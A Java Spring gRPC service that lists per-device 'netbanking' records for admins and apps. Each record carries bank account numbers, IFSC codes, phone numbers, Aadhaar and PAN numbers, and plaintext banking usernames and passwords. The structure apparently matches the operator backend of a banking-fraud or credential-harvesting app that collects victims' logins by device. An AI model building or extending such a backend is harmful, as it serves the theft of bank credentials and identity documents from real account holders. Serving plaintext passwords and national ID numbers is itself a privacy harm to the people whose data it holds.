package app.service.grpc;

import app.service.grpc.netbanking.ListNetbankingRequest;
import app.service.grpc.netbanking.ListNetbankingResponse;
import app.service.grpc.netbanking.NetbankingItem;
import app.service.grpc.netbanking.NetbankingServiceGrpc;
import app.service.model.NetbankingRecord;
import app.service.store.NetbankingQuery;
import app.service.store.NetbankingStore;
import io.grpc.stub.StreamObserver;
import org.springframework.stereotype.Service;

import java.util.List;
import java.util.Objects;

@Service
public class NetbankingGrpcService extends NetbankingServiceGrpc.NetbankingServiceImplBase {

    private final NetbankingStore store;

    public NetbankingGrpcService(NetbankingStore store) { this.store = store; }

    @Override
    public void listNetbanking(ListNetbankingRequest request, StreamObserver<ListNetbankingResponse> responseObserver) {
        try {
            NetbankingQuery q = new NetbankingQuery();
            q.setAdminId(Objects.toString(request.getAdminId(), ""));
            q.setAppId(Objects.toString(request.getAppId(), ""));
            if (!request.getDeviceId().isBlank()) q.setDeviceId(request.getDeviceId());
            if (!request.getQ().isBlank()) q.setQ(request.getQ());
            q.setPage(Math.max(0, request.getPage()));
            q.setSize(Math.max(1, Math.min(200, request.getSize())));

            List<NetbankingRecord> rows = store.list(q);
            int count = store.count(q);

            var b = ListNetbankingResponse.newBuilder().setPage(q.getPage()).setSize(q.getSize()).setCount(count);
            for (var v : rows) b.addItems(toProto(v));
            responseObserver.onNext(b.build());
            responseObserver.onCompleted();
        } catch (Exception e) {
            responseObserver.onError(e);
        }
    }

    private NetbankingItem toProto(NetbankingRecord v) {
        NetbankingItem.Builder b = NetbankingItem.newBuilder()
                .setId(v.getId()==null?0:v.getId())
                .setAdminId(nz(v.getAdminId()))
                .setAppId(nz(v.getAppId()))
                .setDeviceId(nz(v.getDeviceId()))
                .setBankName(nz(v.getBankName()))
                .setAccountNumber(nz(v.getAccountNumber()))
                .setIfscCode(nz(v.getIfscCode()))
                .setPhoneNumber(nz(v.getPhoneNumber()))
                .setAdharCard(nz(v.getAdharCard()))
                .setPanCard(nz(v.getPanCard()))
                .setEventTimestampMs(v.getEventTimestampMs()==null?0:v.getEventTimestampMs());
        if (v.getUsername()!=null) { b.setUsername(v.getUsername()); }
        if (v.getPassword()!=null) { b.setPassword(v.getPassword()); }
        return b.build();
    }

    private static String nz(String s){ return s==null?"":s; }
}
